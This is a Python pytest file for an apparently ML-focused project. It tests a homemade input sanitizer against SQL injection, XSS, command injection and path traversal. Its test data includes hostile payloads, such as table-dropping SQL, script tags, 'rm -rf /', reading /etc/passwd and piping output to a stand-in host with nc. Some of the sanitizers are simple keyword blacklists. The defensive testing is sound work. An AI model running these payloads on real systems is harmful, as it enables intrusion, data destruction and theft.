"""
Input Sanitization Security Tests

Tests input sanitization and validation mechanisms for ML components to prevent
injection attacks, XSS, and other input-based security vulnerabilities across
Phase 3 privacy-preserving and adversarial testing features.

Security Test Coverage:
- SQL injection prevention
- XSS (Cross-Site Scripting) prevention
- Command injection prevention
- Path traversal prevention
- ML model input validation
- Privacy parameter validation
- File upload security
- API input validation
"""

import pytest
import re
import html
import os
import tempfile
from pathlib import Path
from typing import Any, Dict, List, Optional, Union
from unittest.mock import patch, MagicMock
import numpy as np
import json


class InputSanitizer:
    """Input sanitization service for ML components"""
    
    @staticmethod
    def sanitize_sql_input(input_str: str) -> str:
        """Sanitize input to prevent SQL injection"""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        # Remove or escape dangerous SQL characters and keywords
        dangerous_patterns = [
            r"['\"`;]",  # Quote and semicolon
            r"\b(DROP|DELETE|INSERT|UPDATE|EXEC|UNION|SELECT)\b",  # SQL keywords
            r"--",  # SQL comments
            r"/\*.*?\*/",  # SQL block comments
        ]
        
        sanitized = input_str
        for pattern in dangerous_patterns:
            sanitized = re.sub(pattern, "", sanitized, flags=re.IGNORECASE)
        
        # Additional escaping for remaining quotes
        sanitized = sanitized.replace("'", "''").replace('"', '""')
        
        return sanitized.strip()
    
    @staticmethod
    def sanitize_html_input(input_str: str) -> str:
        """Sanitize input to prevent XSS attacks"""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        # HTML escape the input
        sanitized = html.escape(input_str, quote=True)
        
        # Additional protection against javascript: and data: URIs
        dangerous_protocols = [
            r"javascript:",
            r"data:",
            r"vbscript:",
            r"file:",
        ]
        
        for protocol in dangerous_protocols:
            sanitized = re.sub(protocol, "", sanitized, flags=re.IGNORECASE)
        
        return sanitized
    
    @staticmethod
    def sanitize_file_path(file_path: str) -> str:
        """Sanitize file path to prevent path traversal attacks"""
        if not isinstance(file_path, str):
            raise ValueError("File path must be a string")
        
        # Remove dangerous path components
        dangerous_patterns = [
            r"\.\./",  # Parent directory traversal
            r"\.\.\\",  # Windows parent directory traversal
            r"^/",  # Absolute path
            r"^[A-Za-z]:",  # Windows drive letter
        ]
        
        sanitized = file_path
        for pattern in dangerous_patterns:
            sanitized = re.sub(pattern, "", sanitized)
        
        # Normalize path separators
        sanitized = sanitized.replace("\\", "/")
        
        # Remove multiple consecutive slashes
        sanitized = re.sub(r"/+", "/", sanitized)
        
        # Remove leading/trailing slashes and dots
        sanitized = sanitized.strip("./")
        
        return sanitized
    
    @staticmethod
    def sanitize_command_input(input_str: str) -> str:
        """Sanitize input to prevent command injection"""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        # Remove shell metacharacters
        dangerous_chars = [";", "&", "|", "`", "$", "(", ")", "[", "]", "{", "}", "<", ">", "\\n", "\\r"]
        sanitized = input_str
        
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        
        # Remove common command injection patterns
        dangerous_patterns = [
            r"\$\(.*?\)",  # Command substitution
            r"`.*?`",  # Backtick command substitution
            r"&&",  # Command chaining
            r"\|\|",  # OR command chaining
        ]
        
        for pattern in dangerous_patterns:
            sanitized = re.sub(pattern, "", sanitized)
        
        return sanitized.strip()
    
    @staticmethod
    def validate_ml_input_data(data: Any) -> bool:
        """Validate ML model input data"""
        try:
            # Check if data is numpy array or can be converted to one
            if isinstance(data, (list, tuple)):
                np_data = np.array(data)
            elif isinstance(data, np.ndarray):
                np_data = data
            else:
                return False
            
            # Check for reasonable data bounds
            if np_data.size == 0:
                return False
            
            if np_data.size > 1000000:  # Prevent DoS with huge arrays
                return False
            
            # Check for NaN or infinite values
            if np.any(np.isnan(np_data)) or np.any(np.isinf(np_data)):
                return False
            
            # Check for reasonable value ranges
            if np.any(np.abs(np_data) > 1e6):  # Prevent extreme values
                return False
            
            return True
            
        except Exception:
            return False
    
    @staticmethod
    def validate_privacy_parameters(epsilon: float, delta: float) -> bool:
        """Validate differential privacy parameters"""
        try:
            # Epsilon must be positive and reasonable
            if not (0 < epsilon <= 10):
                return False
            
            # Delta must be very small positive number
            if not (0 < delta <= 1e-5):
                return False
            
            return True
            
        except (TypeError, ValueError):
            return False
    
    @staticmethod
    def sanitize_json_input(json_str: str) -> Optional[Dict[str, Any]]:
        """Safely parse and sanitize JSON input"""
        try:
            # Limit JSON size to prevent DoS
            if len(json_str) > 100000:  # 100KB limit
                return None
            
            # Parse JSON
            data = json.loads(json_str)
            
            # Recursively sanitize string values
            def sanitize_recursive(obj):
                if isinstance(obj, dict):
                    return {k: sanitize_recursive(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [sanitize_recursive(item) for item in obj]
                elif isinstance(obj, str):
                    return InputSanitizer.sanitize_html_input(obj)
                else:
                    return obj
            
            return sanitize_recursive(data)
            
        except (json.JSONDecodeError, ValueError):
            return None


@pytest.fixture
def sanitizer():
    """Create input sanitizer for testing"""
    return InputSanitizer()


class TestSQLInjectionPrevention:
    """Test SQL injection prevention"""
    
    def test_basic_sql_injection_patterns(self, sanitizer):
        """Test basic SQL injection pattern prevention"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "admin'--",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users WHERE 1=1; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = sanitizer.sanitize_sql_input(malicious_input)
            
            # Should not contain dangerous SQL keywords
            assert "DROP" not in sanitized.upper()
            assert "DELETE" not in sanitized.upper()
            assert "INSERT" not in sanitized.upper()
            assert "UNION" not in sanitized.upper()
            
            # Should not contain SQL comment markers
            assert "--" not in sanitized
            assert ";" not in sanitized
    
    def test_sql_quote_escaping(self, sanitizer):
        """Test SQL quote escaping"""
        inputs_with_quotes = [
            "O'Reilly",
            'He said "Hello"',
            "It's a test",
            'Quote "this" please'
        ]
        
        for input_str in inputs_with_quotes:
            sanitized = sanitizer.sanitize_sql_input(input_str)
            
            # Single quotes should be escaped as double single quotes
            if "'" in input_str:
                assert "''" in sanitized or "'" not in sanitized
            
            # Double quotes should be escaped
            if '"' in input_str:
                assert '""' in sanitized or '"' not in sanitized
    
    def test_sql_input_type_validation(self, sanitizer):
        """Test SQL input type validation"""
        non_string_inputs = [
            123,
            ["list", "input"],
            {"dict": "input"},
            None
        ]
        
        for invalid_input in non_string_inputs:
            with pytest.raises(ValueError, match="Input must be a string"):
                sanitizer.sanitize_sql_input(invalid_input)


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention"""
    
    def test_basic_xss_patterns(self, sanitizer):
        """Test basic XSS pattern prevention"""
        malicious_scripts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>Click me</div>"
        ]
        
        for script in malicious_scripts:
            sanitized = sanitizer.sanitize_html_input(script)
            
            # Should not contain unescaped script tags
            assert "<script" not in sanitized.lower()
            assert "<img" not in sanitized.lower()
            assert "<svg" not in sanitized.lower()
            assert "<iframe" not in sanitized.lower()
            
            # Should contain escaped versions
            assert "&lt;" in sanitized
            assert "&gt;" in sanitized
    
    def test_javascript_protocol_removal(self, sanitizer):
        """Test javascript: protocol removal"""
        malicious_urls = [
            "javascript:alert('xss')",
            "JAVASCRIPT:void(0)",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd"
        ]
        
        for url in malicious_urls:
            sanitized = sanitizer.sanitize_html_input(url)
            
            # Dangerous protocols should be removed
            assert "javascript:" not in sanitized.lower()
            assert "data:" not in sanitized.lower()
            assert "vbscript:" not in sanitized.lower()
            assert "file:" not in sanitized.lower()
    
    def test_html_attribute_escaping(self, sanitizer):
        """Test HTML attribute escaping"""
        inputs_with_attributes = [
            'onclick="alert(\'xss\')"',
            'onmouseover="javascript:alert(\'xss\')"',
            'href="javascript:void(0)"',
            'src="data:image/svg+xml,<svg onload=alert(1)>"'
        ]
        
        for input_str in inputs_with_attributes:
            sanitized = sanitizer.sanitize_html_input(input_str)
            
            # Quotes should be escaped
            assert "&quot;" in sanitized
            # Single quotes should be escaped
            assert "&#x27;" in sanitized


class TestCommandInjectionPrevention:
    """Test command injection prevention"""
    
    def test_shell_metacharacter_removal(self, sanitizer):
        """Test shell metacharacter removal"""
        malicious_commands = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 8080",
            "file.txt $(cat /etc/passwd)",
            "file.txt `whoami`",
            "file.txt & sleep 10"
        ]
        
        for command in malicious_commands:
            sanitized = sanitizer.sanitize_command_input(command)
            
            # Should not contain dangerous shell characters
            assert ";" not in sanitized
            assert "&" not in sanitized
            assert "|" not in sanitized
            assert "$" not in sanitized
            assert "`" not in sanitized
            assert "(" not in sanitized
            assert ")" not in sanitized
    
    def test_command_substitution_prevention(self, sanitizer):
        """Test command substitution prevention"""
        command_substitutions = [
            "filename_$(ls -la)",
            "filename_`pwd`",
            "filename_${HOME}",
            "filename_$(cat secret.txt)"
        ]
        
        for cmd_sub in command_substitutions:
            sanitized = sanitizer.sanitize_command_input(cmd_sub)
            
            # Command substitution patterns should be removed
            assert "$(" not in sanitized
            assert "`" not in sanitized
            assert "${" not in sanitized


class TestPathTraversalPrevention:
    """Test path traversal attack prevention"""
    
    def test_parent_directory_traversal(self, sanitizer):
        """Test parent directory traversal prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file/../../../secret.txt",
            "uploads/../config/database.yml",
            "./../../admin/users.db"
        ]
        
        for path in malicious_paths:
            sanitized = sanitizer.sanitize_file_path(path)
            
            # Should not contain parent directory references
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert not sanitized.startswith("/")
    
    def test_absolute_path_prevention(self, sanitizer):
        """Test absolute path prevention"""
        absolute_paths = [
            "/etc/passwd",
            "/var/log/secure",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "D:\\secret\\passwords.txt"
        ]
        
        for path in absolute_paths:
            sanitized = sanitizer.sanitize_file_path(path)
            
            # Should not start with root or drive letter
            assert not sanitized.startswith("/")
            assert not re.match(r"^[A-Za-z]:", sanitized)
    
    def test_path_normalization(self, sanitizer):
        """Test path normalization"""
        paths_with_issues = [
            "folder//subfolder///file.txt",
            "folder\\subfolder\\file.txt",
            "./folder/./subfolder/file.txt",
            "folder/subfolder/file.txt/"
        ]
        
        for path in paths_with_issues:
            sanitized = sanitizer.sanitize_file_path(path)
            
            # Should not contain multiple consecutive slashes
            assert "//" not in sanitized
            # Should use forward slashes consistently
            assert "\\" not in sanitized
            # Should not start or end with dots/slashes
            assert not sanitized.startswith(".")
            assert not sanitized.endswith("/")


class TestMLInputValidation:
    """Test ML-specific input validation"""
    
    def test_valid_ml_input_data(self, sanitizer):
        """Test valid ML input data validation"""
        valid_inputs = [
            [1, 2, 3, 4, 5],
            [[1, 2], [3, 4]],
            np.array([0.1, 0.2, 0.3]),
            np.random.randn(10, 5),
            (1.0, 2.0, 3.0)
        ]
        
        for valid_input in valid_inputs:
            assert sanitizer.validate_ml_input_data(valid_input) is True
    
    def test_invalid_ml_input_data(self, sanitizer):
        """Test invalid ML input data validation"""
        invalid_inputs = [
            [],  # Empty data
            np.array([]),  # Empty numpy array
            [float('nan'), 1, 2],  # Contains NaN
            [float('inf'), 1, 2],  # Contains infinity
            [1e7, 2e7, 3e7],  # Values too large
            "not_a_number",  # Wrong type
            {"key": "value"},  # Dictionary
            None  # None value
        ]
        
        for invalid_input in invalid_inputs:
            assert sanitizer.validate_ml_input_data(invalid_input) is False
    
    def test_ml_input_size_limits(self, sanitizer):
        """Test ML input size limits for DoS prevention"""
        # Very large array (should be rejected)
        large_array = np.ones(2000000)  # 2M elements
        assert sanitizer.validate_ml_input_data(large_array) is False
        
        # Reasonable size array (should be accepted)
        reasonable_array = np.ones(1000)  # 1K elements
        assert sanitizer.validate_ml_input_data(reasonable_array) is True


class TestPrivacyParameterValidation:
    """Test privacy parameter validation"""
    
    def test_valid_privacy_parameters(self, sanitizer):
        """Test valid differential privacy parameters"""
        valid_params = [
            (1.0, 1e-6),  # Standard parameters
            (0.1, 1e-8),  # Small epsilon
            (5.0, 1e-5),  # Larger epsilon
            (0.01, 1e-10)  # Very small parameters
        ]
        
        for epsilon, delta in valid_params:
            assert sanitizer.validate_privacy_parameters(epsilon, delta) is True
    
    def test_invalid_privacy_parameters(self, sanitizer):
        """Test invalid differential privacy parameters"""
        invalid_params = [
            (0, 1e-6),  # Zero epsilon
            (-1.0, 1e-6),  # Negative epsilon
            (15.0, 1e-6),  # Too large epsilon
            (1.0, 0),  # Zero delta
            (1.0, -1e-6),  # Negative delta
            (1.0, 1e-3),  # Too large delta
            ("1.0", 1e-6),  # Wrong type
            (1.0, "1e-6")  # Wrong type
        ]
        
        for epsilon, delta in invalid_params:
            assert sanitizer.validate_privacy_parameters(epsilon, delta) is False


class TestJSONInputSanitization:
    """Test JSON input sanitization"""
    
    def test_valid_json_sanitization(self, sanitizer):
        """Test valid JSON sanitization"""
        valid_json = '{"name": "test", "value": 123, "list": [1, 2, 3]}'
        result = sanitizer.sanitize_json_input(valid_json)
        
        assert result is not None
        assert result["name"] == "test"
        assert result["value"] == 123
        assert result["list"] == [1, 2, 3]
    
    def test_json_xss_sanitization(self, sanitizer):
        """Test JSON XSS sanitization"""
        malicious_json = '{"script": "<script>alert(\'xss\')</script>", "normal": "text"}'
        result = sanitizer.sanitize_json_input(malicious_json)
        
        assert result is not None
        assert "<script>" not in result["script"]
        assert "&lt;script&gt;" in result["script"]
        assert result["normal"] == "text"
    
    def test_nested_json_sanitization(self, sanitizer):
        """Test nested JSON sanitization"""
        nested_json = '''{
            "user": {
                "name": "<img src=x onerror=alert('xss')>",
                "preferences": {
                    "theme": "<script>malicious()</script>"
                }
            },
            "data": ["<svg onload=alert(1)>", "normal_text"]
        }'''
        
        result = sanitizer.sanitize_json_input(nested_json)
        
        assert result is not None
        # Nested objects should be sanitized
        assert "<img" not in result["user"]["name"]
        assert "&lt;img" in result["user"]["name"]
        assert "<script>" not in result["user"]["preferences"]["theme"]
        # Arrays should be sanitized
        assert "<svg" not in result["data"][0]
        assert result["data"][1] == "normal_text"
    
    def test_invalid_json_handling(self, sanitizer):
        """Test invalid JSON handling"""
        invalid_jsons = [
            '{"invalid": json}',  # Missing quotes
            '{"unclosed": "string',  # Unclosed string
            '{invalid}',  # Invalid format
            '',  # Empty string
            'not json at all'  # Not JSON
        ]
        
        for invalid_json in invalid_jsons:
            result = sanitizer.sanitize_json_input(invalid_json)
            assert result is None
    
    def test_json_size_limit(self, sanitizer):
        """Test JSON size limits for DoS prevention"""
        # Create very large JSON
        large_json = '{"data": "' + 'x' * 200000 + '"}'  # > 100KB
        result = sanitizer.sanitize_json_input(large_json)
        assert result is None
        
        # Reasonable size should work
        reasonable_json = '{"data": "' + 'x' * 1000 + '"}'  # 1KB
        result = sanitizer.sanitize_json_input(reasonable_json)
        assert result is not None


class TestFileUploadSecurity:
    """Test file upload security validation"""
    
    def test_safe_file_extensions(self, sanitizer):
        """Test safe file extension validation"""
        safe_files = [
            "document.txt",
            "data.csv",
            "model.pkl",
            "config.json",
            "image.png"
        ]
        
        safe_extensions = {".txt", ".csv", ".pkl", ".json", ".png", ".jpg", ".jpeg"}
        
        for filename in safe_files:
            path = Path(filename)
            assert path.suffix in safe_extensions
    
    def test_dangerous_file_extensions(self, sanitizer):
        """Test dangerous file extension detection"""
        dangerous_files = [
            "malware.exe",
            "script.bat",
            "virus.scr",
            "backdoor.cmd",
            "trojan.pif"
        ]
        
        dangerous_extensions = {".exe", ".bat", ".scr", ".cmd", ".pif", ".com", ".jar"}
        
        for filename in dangerous_files:
            path = Path(filename)
            assert path.suffix in dangerous_extensions
    
    def test_file_content_validation(self):
        """Test file content validation"""
        # Create temporary test files
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write("This is safe text content")
            safe_file = f.name
        
        try:
            # Read and validate file content
            with open(safe_file, 'r') as f:
                content = f.read()
                
            # Basic content validation
            assert len(content) > 0
            assert len(content) < 1000000  # Size limit
            assert '\x00' not in content  # No null bytes
            
        finally:
            os.unlink(safe_file)


@pytest.mark.performance
class TestSanitizationPerformance:
    """Test sanitization performance"""
    
    def test_sql_sanitization_performance(self, sanitizer):
        """Test SQL sanitization performance"""
        import time
        
        test_input = "SELECT * FROM users WHERE name = 'test' AND id = 123"
        
        start_time = time.time()
        for _ in range(1000):
            sanitizer.sanitize_sql_input(test_input)
        elapsed_time = time.time() - start_time
        
        # Should sanitize 1000 inputs quickly
        assert elapsed_time < 0.1
        
        avg_time = elapsed_time / 1000
        assert avg_time < 0.0001
    
    def test_html_sanitization_performance(self, sanitizer):
        """Test HTML sanitization performance"""
        import time
        
        test_input = "<div onclick='alert(\"test\")'>Content with <script>malicious()</script> code</div>"
        
        start_time = time.time()
        for _ in range(1000):
            sanitizer.sanitize_html_input(test_input)
        elapsed_time = time.time() - start_time
        
        # Should sanitize 1000 inputs quickly
        assert elapsed_time < 0.1


class TestIntegrationWithMLComponents:
    """Test integration with ML components"""
    
    def test_ml_model_input_pipeline(self, sanitizer):
        """Test ML model input sanitization pipeline"""
        # Simulate ML model input pipeline
        raw_inputs = [
            [1.0, 2.0, 3.0],  # Valid numeric data
            ["1.0", "2.0", "3.0"],  # String numbers (should be converted)
            [1.0, float('nan'), 3.0],  # Contains NaN (should be rejected)
        ]
        
        validated_inputs = []
        for raw_input in raw_inputs:
            try:
                # Convert string inputs to float
                if isinstance(raw_input[0], str):
                    numeric_input = [float(x) for x in raw_input]
                else:
                    numeric_input = raw_input
                
                # Validate the input
                if sanitizer.validate_ml_input_data(numeric_input):
                    validated_inputs.append(numeric_input)
                    
            except (ValueError, TypeError):
                # Skip invalid inputs
                continue
        
        # Should have 2 valid inputs (first two)
        assert len(validated_inputs) == 2
        assert validated_inputs[0] == [1.0, 2.0, 3.0]
        assert validated_inputs[1] == [1.0, 2.0, 3.0]
    
    def test_privacy_preserving_input_validation(self, sanitizer):
        """Test input validation for privacy-preserving features"""
        # Test privacy parameter validation in a typical workflow
        privacy_configs = [
            {"epsilon": 1.0, "delta": 1e-6},  # Valid
            {"epsilon": 0.5, "delta": 1e-8},  # Valid
            {"epsilon": -1.0, "delta": 1e-6},  # Invalid epsilon
            {"epsilon": 1.0, "delta": 1e-3},  # Invalid delta
        ]
        
        valid_configs = []
        for config in privacy_configs:
            if sanitizer.validate_privacy_parameters(config["epsilon"], config["delta"]):
                valid_configs.append(config)
        
        # Should have 2 valid configurations
        assert len(valid_configs) == 2
        assert valid_configs[0]["epsilon"] == 1.0
        assert valid_configs[1]["epsilon"] == 0.5


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])